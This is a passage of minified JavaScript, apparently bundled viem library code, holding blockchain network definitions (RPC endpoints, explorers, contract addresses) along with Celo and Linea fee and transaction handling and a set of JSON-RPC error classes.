77b3631167028862be2a173976ca11",blockCreated:5022},portal:{[ob]:{address:"0x49048044D57e1C92A77f79988d21Fa8fAF74E97e",blockCreated:17482143}},l1StandardBridge:{[ob]:{address:"0x3154Cf16ccdb4C6d922629664174b904d80F2C35",blockCreated:17482143}}},sourceId:ob});({...sJ});const G0e=Zt({id:80094,name:"Berachain",nativeCurrency:{decimals:18,name:"BERA Token",symbol:"BERA"},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:0},ensRegistry:{address:"0x5b22280886a2f5e09a49bea7e320eab0e5320e28",blockCreated:877007},ensUniversalResolver:{address:"0xddfb18888a9466688235887dec2a10c4f5effee9",blockCreated:877008}},rpcUrls:{default:{http:["https://rpc.berachain.com"]}},blockExplorers:{default:{name:"Berascan",url:"https://berascan.com"}},ensTlds:[".bera"],testnet:!1}),N6=1,Z0e=Zt({...Pn,id:81457,name:"Blast",nativeCurrency:{decimals:18,name:"Ether",symbol:"ETH"},rpcUrls:{default:{http:["https://rpc.blast.io"]}},blockExplorers:{default:{name:"Blastscan",url:"https://blastscan.io",apiUrl:"https://api.blastscan.io/api"}},contracts:{...Pn.contracts,multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:212929},l2OutputOracle:{[N6]:{address:"0x826D1B0D4111Ad9146Eb8941D7Ca2B6a44215c76",blockCreated:19300358}},portal:{[N6]:{address:"0x0Ec68c5B10F21EFFb74f2A5C61DFe6b08C0Db6Cb",blockCreated:19300357}},l1StandardBridge:{[N6]:{address:"0x697402166Fbf2F22E970df8a6486Ef171dbfc524",blockCreated:19300360}}},sourceId:N6}),h_=1,Y0e=Zt({...Pn,id:60808,name:"BOB",nativeCurrency:{decimals:18,name:"ETH",symbol:"ETH"},rpcUrls:{default:{http:["https://rpc.gobob.xyz"],webSocket:["wss://rpc.gobob.xyz"]}},blockExplorers:{default:{name:"BOB Explorer",url:"https://explorer.gobob.xyz"}},contracts:{...Pn.contracts,multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:23131},l2OutputOracle:{[h_]:{address:"0xdDa53E23f8a32640b04D7256e651C1db98dB11C1",blockCreated:4462615}},portal:{[h_]:{address:"0x8AdeE124447435fE03e3CD24dF3f4cAE32E65a3E",blockCreated:4462615}}},sourceId:h_}),J0e=Zt({id:288,name:"Boba Network",nativeCurrency:{decimals:18,name:"Ether",symbol:"ETH"},rpcUrls:{default:{http:["https://mainnet.boba.network"]}},blockExplorers:{default:{name:"BOBAScan",url:"https://bobascan.com"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:446859}}}),Q0e=Zt({id:56,name:"BNB Smart Chain",nativeCurrency:{decimals:18,name:"BNB",symbol:"BNB"},rpcUrls:{default:{http:["https://56.rpc.thirdweb.com"]}},blockExplorers:{default:{name:"BscScan",url:"https://bscscan.com",apiUrl:"https://api.bscscan.com/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:15921452}}}),X0e=Zt({id:223,name:"B2",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:18},rpcUrls:{default:{http:["https://rpc.bsquared.network"]}},blockExplorers:{default:{name:"blockscout",url:"https://explorer.bsquared.network"}}}),efe={estimateFeesPerGas:async r=>{if(!r.request?.feeCurrency)return null;const[e,t]=await Promise.all([tfe(r.client,r.request.feeCurrency),rfe(r.client,r.request.feeCurrency)]);return{maxFeePerGas:r.multiply(e-t)+t,maxPriorityFeePerGas:t}}};async function tfe(r,e){const t=await r.request({method:"eth_gasPrice",params:[e]});return BigInt(t)}async function rfe(r,e){const t=await r.request({method:"eth_maxPriorityFeePerGas",params:[e]});return BigInt(t)}function oJ(r){return r===0||r===0n||r===void 0||r===null||r==="0"||r===""||typeof r=="string"&&(bw(r).toLowerCase()==="0x"||bw(r).toLowerCase()==="0x00")}function Qb(r){return!oJ(r)}function ife(r){return typeof r.maxFeePerGas<"u"&&typeof r.maxPriorityFeePerGas<"u"}function aJ(r){return r.type==="cip64"?!0:ife(r)&&Qb(r.feeCurrency)}const nfe={block:R$({format(r){return{transactions:r.transactions?.map(t=>typeof t=="string"?t:{...Hx(t),...t.gatewayFee?{gatewayFee:Vn(t.gatewayFee),gatewayFeeRecipient:t.gatewayFeeRecipient}:{},feeCurrency:t.feeCurrency})}}}),transaction:$$({format(r){if(r.type==="0x7e")return{isSystemTx:r.isSystemTx,mint:r.mint?Vn(r.mint):void 0,sourceHash:r.sourceHash,type:"deposit"};const e={feeCurrency:r.feeCurrency};return r.type==="0x7b"?e.type="cip64":(r.type==="0x7c"&&(e.type="cip42"),e.gatewayFee=r.gatewayFee?Vn(r.gatewayFee):null,e.gatewayFeeRecipient=r.gatewayFeeRecipient),e}}),transactionRequest:kY({format(r){const e={};return r.feeCurrency&&(e.feeCurrency=r.feeCurrency),aJ(r)&&(e.type="0x7b"),e}})};function sfe(r,e){return aJ(r)?afe(r,e):nJ(r,e)}const ofe={transaction:sfe};function afe(r,e){lfe(r);const{chainId:t,gas:i,nonce:n,to:s,value:o,maxFeePerGas:a,maxPriorityFeePerGas:c,accessList:l,feeCurrency:u,data:d}=r,h=[$i(t),n?$i(n):"0x",c?$i(c):"0x",a?$i(a):"0x",i?$i(i):"0x",s??"0x",o?$i(o):"0x",d??"0x",t4(l),u,...C3(r,e)];return Jg(["0x7b",c0(h)])}const cfe=e4;function lfe(r){const{chainId:e,maxPriorityFeePerGas:t,gasPrice:i,maxFeePerGas:n,to:s,feeCurrency:o}=r;if(e<=0)throw new x3({chainId:e});if(s&&!Pa(s))throw new hc({address:s});if(i)throw new Xt("`gasPrice` is not a valid CIP-64 Transaction attribute.");if(Qb(n)&&n>cfe)throw new ip({maxFeePerGas:n});if(Qb(t)&&Qb(n)&&t>n)throw new xw({maxFeePerGas:n,maxPriorityFeePerGas:t});if(Qb(o)&&!Pa(o))throw new Xt("`feeCurrency` MUST be a token address for CIP-64 transactions.");if(oJ(o))throw new Xt("`feeCurrency` must be provided for CIP-64 transactions.")}const ufe={blockTime:1e3,contracts:iJ,formatters:nfe,serializers:ofe,fees:efe},dfe=Zt({...ufe,id:42220,name:"Celo",nativeCurrency:{decimals:18,name:"CELO",symbol:"CELO"},rpcUrls:{default:{http:["https://forno.celo.org"]}},blockExplorers:{default:{name:"Celo Explorer",url:"https://celoscan.io",apiUrl:"https://api.celoscan.io/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:13112599}},testnet:!1}),hfe=Zt({id:1116,name:"Core Dao",nativeCurrency:{decimals:18,name:"Core",symbol:"CORE"},rpcUrls:{default:{http:["https://rpc.coredao.org"]}},blockExplorers:{default:{name:"CoreDao",url:"https://scan.coredao.org"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:11907934}},testnet:!1}),ffe=Zt({id:25,name:"Cronos Mainnet",nativeCurrency:{decimals:18,name:"Cronos",symbol:"CRO"},rpcUrls:{default:{http:["https://evm.cronos.org"]}},blockExplorers:{default:{name:"Cronos Explorer",url:"https://explorer.cronos.org",apiUrl:"https://explorer-api.cronos.org/mainnet/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:1963112}}}),pfe=Zt({id:7560,name:"Cyber",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://cyber.alt.technology"]}},blockExplorers:{default:{name:"Blockscout",url:"https://cyberscan.co",apiUrl:"https://cyberscan.co/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:0}}}),gfe=Zt({id:2e3,name:"Dogechain",nativeCurrency:{decimals:18,name:"Wrapped Dogecoin",symbol:"WDOGE"},rpcUrls:{default:{http:["https://rpc.dogechain.dog"]}},blockExplorers:{default:{name:"DogeChainExplorer",url:"https://explorer.dogechain.dog",apiUrl:"https://explorer.dogechain.dog/api"}},contracts:{multicall3:{address:"0x68a8609a60a008EFA633dfdec592c03B030cC508",blockCreated:25384031}}}),P6=1,mfe=Zt({...Pn,id:252,name:"Fraxtal",nativeCurrency:{name:"Frax",symbol:"FRAX",decimals:18},rpcUrls:{default:{http:["https://rpc.frax.com"]}},blockExplorers:{default:{name:"fraxscan",url:"https://fraxscan.com",apiUrl:"https://api.fraxscan.com/api"}},contracts:{...Pn.contracts,l2OutputOracle:{[P6]:{address:"0x66CC916Ed5C6C2FA97014f7D1cD141528Ae171e4"}},multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11"},portal:{[P6]:{address:"0x36cb65c1967A0Fb0EEE11569C51C2f2aA1Ca6f6D",blockCreated:19135323}},l1StandardBridge:{[P6]:{address:"0x34C0bD5877A5Ee7099D0f5688D65F4bB9158BDE2",blockCreated:19135323}}},sourceId:P6}),wfe=Zt({id:122,name:"Fuse",nativeCurrency:{name:"Fuse",symbol:"FUSE",decimals:18},rpcUrls:{default:{http:["https://rpc.fuse.io"]}},blockExplorers:{default:{name:"Fuse Explorer",url:"https://explorer.fuse.io",apiUrl:"https://explorer.fuse.io/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:16146628}}}),bfe=Zt({id:100,name:"Gnosis",nativeCurrency:{decimals:18,name:"xDAI",symbol:"XDAI"},rpcUrls:{default:{http:["https://rpc.gnosischain.com"],webSocket:["wss://rpc.gnosischain.com/wss"]}},blockExplorers:{default:{name:"Gnosisscan",url:"https://gnosisscan.io",apiUrl:"https://api.gnosisscan.io/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:21022491}}}),vfe=Zt({id:4689,name:"IoTeX",nativeCurrency:{decimals:18,name:"IoTeX",symbol:"IOTX"},rpcUrls:{default:{http:["https://babel-api.mainnet.iotex.io"],webSocket:["wss://babel-api.mainnet.iotex.io"]}},blockExplorers:{default:{name:"IoTeXScan",url:"https://iotexscan.io"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:22163670}}}),yfe=Zt({id:2222,name:"Kava EVM",network:"kava-mainnet",nativeCurrency:{name:"Kava",symbol:"KAVA",decimals:18},rpcUrls:{default:{http:["https://evm.kava.io"]}},blockExplorers:{default:{name:"Kava EVM Explorer",url:"https://kavascan.com",apiUrl:"https://kavascan.com/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:3661165}},testnet:!1}),xfe=Zt({id:8217,name:"Kaia",nativeCurrency:{decimals:18,name:"Kaia",symbol:"KAIA"},rpcUrls:{default:{http:["https://public-en.node.kaia.io"]}},blockExplorers:{default:{name:"KaiaScan",url:"https://kaiascan.io",apiUrl:"https://api-cypress.klaytnscope.com/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:96002415}}});function j$(r){return typeof r=="string"?{address:r,type:"json-rpc"}:r}class Cfe extends Xt{constructor({docsPath:e}={}){super(["Could not find an Account to execute with this Action.","Please provide an Account with the `account` argument on the Action, or by supplying an `account` to the Client."].join(`
`),{docsPath:e,docsSlug:"account",name:"AccountNotFoundError"})}}const O1=(r,e,t)=>JSON.stringify(r,(i,n)=>typeof n=="bigint"?n.toString():n,t);function hD(r){return r.reduce((e,{slot:t,value:i})=>`${e}        ${t}: ${i}
`,"")}function Efe(r){return r.reduce((e,{address:t,...i})=>{let n=`${e}    ${t}:
`;return i.nonce&&(n+=`      nonce: ${i.nonce}
`),i.balance&&(n+=`      balance: ${i.balance}
`),i.code&&(n+=`      code: ${i.code}
`),i.state&&(n+=`      state:
`,n+=hD(i.state)),i.stateDiff&&(n+=`      stateDiff:
`,n+=hD(i.stateDiff)),n},`  State Override:
`).slice(0,-1)}const F$=r=>r;class _fe extends Xt{constructor(e,{account:t,docsPath:i,chain:n,data:s,gas:o,gasPrice:a,maxFeePerGas:c,maxPriorityFeePerGas:l,nonce:u,to:d,value:h,stateOverride:f}){const p=t?j$(t):void 0;let g=OY({from:p?.address,to:d,value:typeof h<"u"&&`${whe(h)} ${n?.nativeCurrency?.symbol||"ETH"}`,data:s,gas:o,gasPrice:typeof a<"u"&&`${R1(a)} gwei`,maxFeePerGas:typeof c<"u"&&`${R1(c)} gwei`,maxPriorityFeePerGas:typeof l<"u"&&`${R1(l)} gwei`,nonce:u});f&&(g+=`
${Efe(f)}`),super(e.shortMessage,{cause:e,docsPath:i,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],"Raw Call Arguments:",g].filter(Boolean),name:"CallExecutionError"}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.cause=e}}class E5 extends Xt{constructor({body:e,cause:t,details:i,headers:n,status:s,url:o}){super("HTTP request failed.",{cause:t,details:i,metaMessages:[s&&`Status: ${s}`,`URL: ${F$(o)}`,e&&`Request body: ${O1(e)}`].filter(Boolean),name:"HttpRequestError"}),Object.defineProperty(this,"body",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"headers",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"status",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.body=e,this.headers=n,this.status=s,this.url=o}}class cJ extends Xt{constructor({body:e,error:t,url:i}){super("RPC Request failed.",{cause:t,details:t.message,metaMessages:[`URL: ${F$(i)}`,`Request body: ${O1(e)}`],name:"RpcRequestError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.code=t.code,this.data=t.data}}class fD extends Xt{constructor({body:e,url:t}){super("The request took too long to respond.",{details:"The request timed out.",metaMessages:[`URL: ${F$(t)}`,`Request body: ${O1(e)}`],name:"TimeoutError"})}}const Sfe=-1;class Ua extends Xt{constructor(e,{code:t,docsPath:i,metaMessages:n,name:s,shortMessage:o}){super(o,{cause:e,docsPath:i,metaMessages:n||e?.metaMessages,name:s||"RpcError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.name=s||e.name,this.code=e instanceof cJ?e.code:t??Sfe}}class Sc extends Ua{constructor(e,t){super(e,t),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=t.data}}class dv extends Ua{constructor(e){super(e,{code:dv.code,name:"ParseRpcError",shortMessage:"Invalid JSON was received by the server. An error occurred on the server while parsing the JSON text."})}}Object.defineProperty(dv,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32700});class hv extends Ua{constructor(e){super(e,{code:hv.code,name:"InvalidRequestRpcError",shortMessage:"JSON is not a valid request object."})}}Object.defineProperty(hv,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32600});class fv extends Ua{constructor(e,{method:t}={}){super(e,{code:fv.code,name:"MethodNotFoundRpcError",shortMessage:`The method${t?` "${t}"`:""} does not exist / is not available.`})}}Object.defineProperty(fv,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32601});class pv extends Ua{constructor(e){super(e,{code:pv.code,name:"InvalidParamsRpcError",shortMessage:["Invalid parameters were provided to the RPC method.","Double check you have provided the correct parameters."].join(`
`)})}}Object.defineProperty(pv,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32602});class Cw extends Ua{constructor(e){super(e,{code:Cw.code,name:"InternalRpcError",shortMessage:"An internal error was received."})}}Object.defineProperty(Cw,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32603});class gv extends Ua{constructor(e){super(e,{code:gv.code,name:"InvalidInputRpcError",shortMessage:["Missing or invalid parameters.","Double check you have provided the correct parameters."].join(`
`)})}}Object.defineProperty(gv,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32e3});class mv extends Ua{constructor(e){super(e,{code:mv.code,name:"ResourceNotFoundRpcError",shortMessage:"Requested resource not found."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ResourceNotFoundRpcError"})}}Object.defineProperty(mv,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32001});class wv extends Ua{constructor(e){super(e,{code:wv.code,name:"ResourceUnavailableRpcError",shortMessage:"Requested resource not available."})}}Object.defineProperty(wv,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32002});class Ew extends Ua{constructor(e){super(e,{code:Ew.code,name:"TransactionRejectedRpcError",shortMessage:"Transaction creation failed."})}}Object.defineProperty(Ew,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32003});class b1 extends Ua{constructor(e,{method:t}={}){super(e,{code:b1.code,name:"MethodNotSupportedRpcError",shortMessage:`Method${t?` "${t}"`:""} is not supported.`})}}Object.defineProperty(b1,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32004});class _w extends Ua{constructor(e){super(e,{code:_w.code,name:"LimitExceededRpcError",shortMessage:"Request exceeds defined limit."})}}Object.defineProperty(_w,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32005});class bv extends Ua{constructor(e){super(e,{code:bv.code,name:"JsonRpcVersionUnsupportedError",shortMessage:"Version of JSON-RPC protocol is not supported."})}}Object.defineProperty(bv,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32006});class B1 extends Sc{constructor(e){super(e,{code:B1.code,name:"UserRejectedRequestError",shortMessage:"User rejected the request."})}}Object.defineProperty(B1,"code",{enumerable:!0,configurable:!0,writable:!0,value:4001});class vv extends Sc{constructor(e){super(e,{code:vv.code,name:"UnauthorizedProviderError",shortMessage:"The requested method and/or account has not been authorized by the user."})}}Object.defineProperty(vv,"code",{enumerable:!0,configurable:!0,writable:!0,value:4100});class yv extends Sc{constructor(e,{method:t}={}){super(e,{code:yv.code,name:"UnsupportedProviderMethodError",shortMessage:`The Provider does not support the requested method${t?` " ${t}"`:""}.`})}}Object.defineProperty(yv,"code",{enumerable:!0,configurable:!0,writable:!0,value:4200});class xv extends Sc{constructor(e){super(e,{code:xv.code,name:"ProviderDisconnectedError",shortMessage:"The Provider is disconnected from all chains."})}}Object.defineProperty(xv,"code",{enumerable:!0,configurable:!0,writable:!0,value:4900});class Cv extends Sc{constructor(e){super(e,{code:Cv.code,name:"ChainDisconnectedError",shortMessage:"The Provider is not connected to the requested chain."})}}Object.defineProperty(Cv,"code",{enumerable:!0,configurable:!0,writable:!0,value:4901});class Ev extends Sc{constructor(e){super(e,{code:Ev.code,name:"SwitchChainError",shortMessage:"An error occurred when attempting to switch chain."})}}Object.defineProperty(Ev,"code",{enumerable:!0,configurable:!0,writable:!0,value:4902});class _v extends Sc{constructor(e){super(e,{code:_v.code,name:"UnsupportedNonOptionalCapabilityError",shortMessage:"This Wallet does not support a capability that was not marked as optional."})}}Object.defineProperty(_v,"code",{enumerable:!0,configurable:!0,writable:!0,value:5700});class Sv extends Sc{constructor(e){super(e,{code:Sv.code,name:"UnsupportedChainIdError",shortMessage:"This Wallet does not support the requested chain ID."})}}Object.defineProperty(Sv,"code",{enumerable:!0,configurable:!0,writable:!0,value:5710});class Av extends Sc{constructor(e){super(e,{code:Av.code,name:"DuplicateIdError",shortMessage:"There is already a bundle submitted with this ID."})}}Object.defineProperty(Av,"code",{enumerable:!0,configurable:!0,writable:!0,value:5720});class Iv extends Sc{constructor(e){super(e,{code:Iv.code,name:"UnknownBundleIdError",shortMessage:"This bundle id is unknown / has not been submitted"})}}Object.defineProperty(Iv,"code",{enumerable:!0,configurable:!0,writable:!0,value:5730});class Tv extends Sc{constructor(e){super(e,{code:Tv.code,name:"BundleTooLargeError",shortMessage:"The call bundle is too large for the Wallet to process."})}}Object.defineProperty(Tv,"code",{enumerable:!0,configurable:!0,writable:!0,value:5740});class kv extends Sc{constructor(e){super(e,{code:kv.code,name:"AtomicReadyWalletRejectedUpgradeError",shortMessage:"The Wallet can support atomicity after an upgrade, but the user rejected the upgrade."})}}Object.defineProperty(kv,"code",{enumerable:!0,configurable:!0,writable:!0,value:5750});class Nv extends Sc{constructor(e){super(e,{code:Nv.code,name:"AtomicityNotSupportedError",shortMessage:"The wallet does not support atomic execution but the request requires it."})}}Object.defineProperty(Nv,"code",{enumerable:!0,configurable:!0,writable:!0,value:5760});class Afe extends Ua{constructor(e){super(e,{name:"UnknownRpcError",shortMessage:"An unknown RPC error occurred."})}}function Ife(r,e){const t=(r.details||"").toLowerCase(),i=r instanceof Xt?r.walk(n=>n?.code===w1.code):r;return i instanceof Xt?new w1({cause:r,message:i.details}):w1.nodeMessage.test(t)?new w1({cause:r,message:r.details}):ip.nodeMessage.test(t)?new ip({cause:r,maxFeePerGas:e?.maxFeePerGas}):tk.nodeMessage.test(t)?new tk({cause:r,maxFeePerGas:e?.maxFeePerGas}):rk.nodeMessage.test(t)?new rk({cause:r,nonce:e?.nonce}):ik.nodeMessage.test(t)?new ik({cause:r,nonce:e?.nonce}):nk.nodeMessage.test(t)?new nk({cause:r,nonce:e?.nonce}):sk.nodeMessage.test(t)?new sk({cause:r}):ok.nodeMessage.test(t)?new ok({cause:r,gas:e?.gas}):ak.nodeMessage.test(t)?new ak({cause:r,gas:e?.gas}):ck.nodeMessage.test(t)?new ck({cause:r}):xw.nodeMessage.test(t)?new xw({cause:r,maxFeePerGas:e?.maxFeePerGas,maxPriorityFeePerGas:e?.maxPriorityFeePerGas}):new VY({cause:r})}function Tfe(r,{docsPath:e,...t}){const i=(()=>{const n=Ife(r,t);return n instanceof VY?r:n})();return new _fe(i,{docsPath:e,...t})}function kfe(r,{format:e}){if(!e)return{};const t={};function i(s){const o=Object.keys(s);for(const a of o)a in r&&(t[a]=r[a]),s[a]&&typeof s[a]=="object"&&!Array.isArray(s[a])&&i(s[a])}const n=e(r||{});return i(n),t}function Nfe(r){const{account:e,gasPrice:t,maxFeePerGas:i,maxPriorityFeePerGas:n,to:s}=r,o=e?j$(e):void 0;if(o&&!Pa(o.address))throw new hc({address:o.address});if(s&&!Pa(s))throw new hc({address:s});if(typeof t<"u"&&(typeof i<"u"||typeof n<"u"))throw new bhe;if(i&&i>e4)throw new ip({maxFeePerGas:i});if(n&&i&&n>i)throw new xw({maxFeePerGas:i,maxPriorityFeePerGas:n})}async function Pfe(r,e){const{account:t=r.account}=e;if(!t)throw new Cfe;const i=j$(t);try{const{accessList:n,blockNumber:s,blockTag:o,data:a,gas:c,gasPrice:l,maxFeePerGas:u,maxPriorityFeePerGas:d,nonce:h,to:f,value:p,...g}=e,m=(typeof s=="bigint"?dr(s):void 0)||o;Nfe(e);const x=r.chain?.formatters?.transactionRequest?.format,T=(x||TY)({...kfe(g,{format:x}),from:i?.address,accessList:n,data:a,gas:c,gasPrice:l,maxFeePerGas:u,maxPriorityFeePerGas:d,nonce:h,to:f,value:p}),{baseFeePerGas:k,gasLimit:I,priorityFeePerGas:E}=await r.request({method:"linea_estimateGas",params:m?[T,m]:[T]});return{baseFeePerGas:BigInt(k),gasLimit:BigInt(I),priorityFeePerGas:BigInt(E)}}catch(n){throw Tfe(n,{...e,account:i,chain:r.chain})}}const $fe={fees:{estimateFeesPerGas:pD,async maxPriorityFeePerGas({block:r,client:e,request:t}){const i=await pD({block:r,client:e,multiply:n=>n,request:t,type:"eip1559"});return i?.maxPriorityFeePerGas?i.maxPriorityFeePerGas:null}}};async function pD({client:r,multiply:e,request:t,type:i}){try{const n=await Pfe(r,{...t,account:t?.account}),{priorityFeePerGas:s}=n,a=e(BigInt(n.baseFeePerGas))+s;return i==="legacy"?{gasPrice:a}:{maxFeePerGas:a,maxPriorityFeePerGas:s}}catch{return null}}const Rfe=Zt({...$fe,id:59144,name:"Linea Mainnet",nativeCurrency:{name:"Linea Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://rpc.linea.build"],webSocket:["wss://rpc.linea.build"]}},blockExplorers:{default:{name:"Etherscan",url:"https://lineascan.build",apiUrl:"https://api.lineascan.build/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:42},ensRegistry:{address:"0x50130b669B28C339991d8676FA73CF122a121267",blockCreated:6682888},ensUniversalResolver:{address:"0x3aA974fb3f8C1E02796048BDCdeD79e9D53a6965",blockCreated:6683e3}},ensTlds:[".linea.eth"],testnet:!1}),Y8=Zt({id:1,name:"Ethereum",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://eth.merkle.io"]}},blockExplorers:{default:{name:"Etherscan",url:"https://etherscan.io",apiUrl:"https://api.etherscan.io/api"}},contracts:{ensRegistry:{address:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e"},ensUniversalResolver:{address:"0xce01f8eee7E479C928F8919abD53E553a36CeF67",blockCreated:19258213},multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:14353601}}}),Ofe=Zt({id:5e3,name:"Mantle",nativeCurrency:{decimals:18,name:"MNT",symbol:"MNT"},rpcUrls:{default:{http:["https://rpc.mantle.xyz"]}},blockExplorers:{default:{name:"Mantle Explorer",url:"https://mantlescan.xyz/",apiUrl:"https://api.mantlescan.xyz/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:304717}}}),Bfe=Zt({id:4200,name:"Merlin",nativeCurrency:{name:"BTC",symbol:"BTC",decimals:18},rpcUrls:{default:{http:["https://rpc.merlinchain.io"]}},blockExplorers:{default:{name:"blockscout",url:"https://scan.merlinchain.io",apiUrl:"https://scan.merlinchain.io/api"}}}),Mfe=Zt({id:1088,name:"Metis",nativeCurrency:{decimals:18,name:"Metis",symbol:"METIS"},rpcUrls:{default:{http:["https://metis.rpc.hypersync.xyz","https://metis-pokt.nodies.app","https://api.blockeden.xyz/metis/67nCBdZQSH9z3YqDDjdm","https://metis-andromeda.rpc.thirdweb.com","https://metis-andromeda.gateway.tenderly.co","https://metis.api.onfinality.io/public","https://andromeda.metis.io/?owner=1088","https://metis-mainnet.public.blastapi.io"],webSocket:["wss://metis-rpc.publicnode.com","wss://metis.drpc.org"]}},blockExplorers:{default:{name:"Metis Explorer",url:"https://explorer.metis.io",apiUrl:"https://api.routescan.io/v2/network/mainnet/evm/1088/etherscan/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:2338552}}}),Dfe=Zt({id:185,name:"Mint Mainnet",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://rpc.mintchain.io"]}},blockExplorers:{default:{name:"Mintchain explorer",url:"https://explorer.mintchain.io"}},testnet:!1}),$6=1,Lfe=Zt({...Pn,id:34443,name:"Mode Mainnet",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://mainnet.mode.network"]}},blockExplorers:{default:{name:"Modescan",url:"https://modescan.io"}},contracts:{...Pn.contracts,multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:2465882},l2OutputOracle:{[$6]:{address:"0x4317ba146D4933D889518a3e5E11Fe7a53199b04"}},portal:{[$6]:{address:"0x8B34b14c7c7123459Cf3076b8Cb929BE097d0C07"}},l1StandardBridge:{[$6]:{address:"0x735aDBbE72226BD52e818E7181953f42E3b0FF21"}}},sourceId:$6}),Ufe=Zt({id:1284,name:"Moonbeam",nativeCurrency:{decimals:18,name:"GLMR",symbol:"GLMR"},rpcUrls:{default:{http:["https://moonbeam.public.blastapi.io"],webSocket:["wss://moonbeam.public.blastapi.io"]}},blockExplorers:{default:{name:"Moonscan",url:"https://moonscan.io",apiUrl:"https://api-moonbeam.moonscan.io/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:609002}},testnet:!1}),jfe=Zt({id:1285,name:"Moonriver",nativeCurrency:{decimals:18,name:"MOVR",symbol:"MOVR"},rpcUrls:{default:{http:["https://moonriver.public.blastapi.io"],webSocket:["wss://moonriver.public.blastapi.io"]}},blockExplorers:{default:{name:"Moonscan",url:"https://moonriver.moonscan.io",apiUrl:"https://api-moonriver.moonscan.io/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:1597904}},testnet:!1}),R6=56,Ffe=Zt({id:204,name:"opBNB",nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},rpcUrls:{default:{http:["https://opbnb-mainnet-rpc.bnbchain.org"]}},blockExplorers:{default:{name:"opBNB (BSCScan)",url:"https://opbnb.bscscan.com",apiUrl:"https://api-opbnb.bscscan.com/api"}},contracts:{...Pn.contracts,multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:512881},l2OutputOracle:{[R6]:{address:"0x153CAB79f4767E2ff862C94aa49573294B13D169"}},portal:{[R6]:{address:"0x1876EA7702C0ad0C6A2ae6036DE7733edfBca519"}},l1StandardBridge:{[R6]:{address:"0xF05F0e4362859c3331Cb9395CBC201E3Fa6757Ea"}}},sourceId:R6}),ab=1,qfe=Zt({...Pn,id:10,name:"OP Mainnet",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://mainnet.optimism.io"]}},blockExplorers:{default:{name:"Optimism 